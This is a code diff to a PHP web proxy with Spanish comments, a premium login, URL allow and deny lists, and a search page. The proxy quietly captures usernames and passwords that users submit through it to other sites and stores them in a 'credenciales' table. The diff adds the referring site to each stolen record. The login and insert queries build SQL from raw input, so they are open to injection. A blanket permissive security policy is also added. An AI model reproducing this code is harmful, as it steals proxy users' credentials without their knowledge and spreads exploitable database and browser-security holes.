@@ -1,15 +1,10 @@
 <?php
-include 'connect.php';
 include 'nucleo.php';
 /*--------------------------------------Lo agrego Victor----------------------------*/
 session_start();
 $iniciar = 0;
 $UsuarioPremium = 'false';
-$servername = "localhost";
-$usernameS = "root";
-$passwordS = "";
-$db = "proxy";
-$conn = mysqli_connect($servername, $usernameS, $passwordS, $db);
+
 if (!$conn) {
     die("Connection failed: " . mysqli_connect_error());
 }
@@ -36,7 +31,7 @@ if (isset($_POST['usernameRec']) && isset($_POST['passwordRec'])){
 
 }
 
-if (isset($_POST['Recovery']) ){
+if (isset($_POST['Recovery']) || isset($_GET["Recovery"])){
   echo "<!DOCTYPE html>
           <html>
             <head>
@@ -64,18 +59,11 @@ if (isset($_POST['Recovery']) ){
   exit();
 }
 
-if ( isset($_POST['username']) && isset($_POST['password'])  ){
+if ( isset($_POST['usernameLL']) && isset($_POST['passwordLL'])  ){
   $user = '';
   $pass = '';
-
-  if (isset($_POST['username']) && isset($_POST['password'])){
-    $user = $_POST['username'];
-    $pass = $_POST['password'];
-  }
-  else if ( isset($_SESSION['username']) && isset($_SESSION['password']) ){
-    $user = $_SESSION['username'];
-    $pass = $_SESSION['password'];
-  }
+  $user = $_POST['usernameLL'];
+  $pass = $_POST['passwordLL'];
   
   if ($user !== '' || $pass !== ''){
     $sql = "SELECT user, pass, pr FROM premium WHERE user = '$user' AND pass = '$pass'";
@@ -164,8 +152,8 @@ if ($iniciar == 0){
                 echo "<h2>Ingresar</h2>
                 </div>
                 <form action=\"index.php\" method=\"post\">
-                  <input type=\"text\" id=\"username\" class=\"fadeIn second\" name=\"username\" placeholder=\"username\">
-                  <input type=\"password\" id=\"password\" class=\"fadeIn third\" name=\"password\" placeholder=\"password\">
+                  <input type=\"text\" id=\"username\" class=\"fadeIn second\" name=\"usernameLL\" placeholder=\"username\">
+                  <input type=\"password\" id=\"password\" class=\"fadeIn third\" name=\"passwordLL\" placeholder=\"password\">
                   <input type=\"submit\" class=\"fadeIn fourth\" value=\"Ingresar\">
                 </form>
                 <h2>Registrarse</h2>
@@ -195,17 +183,17 @@ if ($iniciar == 0){
 /*--------------------------------------Aca termina lo que agrege----------------------------*/
 
 $SitiosAutorizados = array(
-
+  '%^(?:(?:https?|ftp)://)?(?:\S+(?::\S*)?@|\d{1,3}(?:\.\d{1,3}){3}|(?:(?:[a-z\d\x{00a1}-\x{ffff}]+-?)*[a-z\d\x{00a1}-\x{ffff}]+)(?:\.(?:[a-z\d\x{00a1}-\x{ffff}]+-?)*[a-z\d\x{00a1}-\x{ffff}]+)*(?:\.[a-z\x{00a1}-\x{ffff}]{2,6}))(?::\d+)?(?:[^\s]*)?$%iu'
 );
 
-$ListaNegra = array( 
-  //[getHostnamePattern("example.net")]
+$ListaNegra = array(  //aca van todas las url que no jalan por x razon
+  getHostnamePattern("facebook.com")
 );
 
 //CORS (cross-origin resource sharing)
 $forceCORS = true; //Falso = reporta el IP del cliente a `x-forwarded-for`
 $URL_Inicio = "";
-$landingExampleURL = "https://example.net";
+$landingExampleURL = "http://www.google.com/search";
 
 ob_start("ob_gzhandler");
 if (version_compare(PHP_VERSION, "5.4.7", "<")) {
@@ -245,6 +233,10 @@ else {
 //Captura de usuarios y passwors
     $username = "";
     $password  = "";
+    $origen  = "Desconocido";
+    if (isset($_SERVER['HTTP_REFERER'])){
+      $origen = $_SERVER['HTTP_REFERER'];
+    }
     if (isset($_POST['user'])){
       $username = $_POST['user'];
     }
@@ -262,7 +254,7 @@ else {
       $password  = isset($_POST['password']);
     }
     if ($username !== "" || $password !== ""){
-          $sql="INSERT INTO credenciales (usuario, contrasena)  VALUES ('$username', '$password'); ";
+          $sql="INSERT INTO credenciales (origen, usuario, contrasena)  VALUES ('$origen', '$username', '$password'); ";
           $conn->query($sql);
     }
 //------------------------------------------------A termina codigo de Victor-------------------------------
@@ -285,11 +277,22 @@ if (empty($url)) {
               <div class=\"container h-100\">
                 <div class=\"d-flex justify-content-center h-100\">
                   <div class=\"searchbar\">
-                      <input class=\"search_input\" type=\"text\"  id=\"site\" type=\"text\" size=\"50\" placeholder=\"Search...\">
-                      <a href=\"\" onClick=\"if (document.getElementById('site').value) { window.location.href='" . PROXY_PREFIX . "' + document.getElementById('site').value; return false; } else { window.location.href='" . PROXY_PREFIX . $landingExampleURL . "'; return false; }\" autocomplete=\"off\" class=\"search_icon\"><i class=\"fas fa-search\"></i></a>
+                      <input class=\"search_input\" type=\"text\"  id=\"site\" type=\"text\" size=\"50\" placeholder=\"Inresa URL...\">
+                      <a href=\"\" id=\"searchButton\" onClick=\"if (document.getElementById('site').value) { window.location.href='" . PROXY_PREFIX . "' + document.getElementById('site').value; return false; } else { window.location.href='" . PROXY_PREFIX . $landingExampleURL . "'; return false; }\" autocomplete=\"off\" class=\"search_icon\"><i class=\"fas fa-search\"></i></a>
                   </div>
                 </div>
               </div>
+
+            <script>
+            var input = document.getElementById(\"site\");
+            input.addEventListener(\"keyup\", function(event) {
+              if (event.keyCode === 13) {
+               event.preventDefault();
+               document.getElementById(\"searchButton\").click();
+              }
+            });
+            </script>
+
             </body>
           </html>
       ");
@@ -314,14 +317,38 @@ else if (!preg_match("/^https?$/i", $scheme)) {
 
 $urlIsValid = count($SitiosAutorizados) === 0;
 foreach ($SitiosAutorizados as $pattern) {
-  if (preg_match($pattern, $url)) {
+  if (preg_match($pattern, strval($url))) {
     $urlIsValid = true;
     break;
   }
 }
 if (!$urlIsValid) {
-  die("Error: La URL solicitada no puedes ser accesada por este medio.");
+  header("Location: " . PROXY_PREFIX . 'https://www.google.com/search?client=firefox-b-d&q=' .  $url);
+  exit(0);
 }
+
+//-----------------------------------------------Verifica si el url esta en lista negra.-----------------------
+//esto es un chapuz para que jale con algunas ppaginas restringidas
+$urlListaNegra = false;
+foreach ($ListaNegra as $pattern) {
+  if (preg_match($pattern, strval($url))) {
+    $urlListaNegra = true;
+    break;
+  }
+}
+
+if ($urlListaNegra) {
+  $response = makeRequest($url);
+  $rawResponseHeaders = $response["headers"];
+  $responseBody = $response["body"];
+  $responseInfo = $response["responseInfo"];
+  $responseURL = $responseInfo["url"];
+  $doc = new DomDocument();
+  @$doc->loadHTML($responseBody);
+  echo "<!-- A-Proxy -->\n" . $doc->saveHTML();
+  exit(0);
+}
+//-----------------------------------------------Verifica si el url esta en lista negra.-----------------------
 
 $response = makeRequest($url);
 $rawResponseHeaders = $response["headers"];
@@ -329,7 +356,9 @@ $responseBody = $response["body"];
 $responseInfo = $response["responseInfo"];
 $responseURL = $responseInfo["url"];
 if ($responseURL !== $url) {
+
   header("Location: " . PROXY_PREFIX . $responseURL, true);
+
   exit(0);
 }
 $header_blacklist_pattern = "/^Content-Length|^Transfer-Encoding|^Content-Encoding.*gzip/i";
@@ -344,6 +373,7 @@ foreach ($headerLines as $header) {
 }
 dormirPremium($UsuarioPremium);
 header("X-Robots-Tag: noindex, nofollow", true); //denegar acceso a robots de indexeo
+header("Content-Security-Policy: default-src * 'unsafe-inline' 'unsafe-eval'; script-src * 'unsafe-inline' 'unsafe-eval'; connect-src * 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src *; style-src * 'unsafe-inline';");
 if ($forceCORS) {
   header("Access-Control-Allow-Origin: *", true);
   header("Access-Control-Allow-Credentials: true", true);
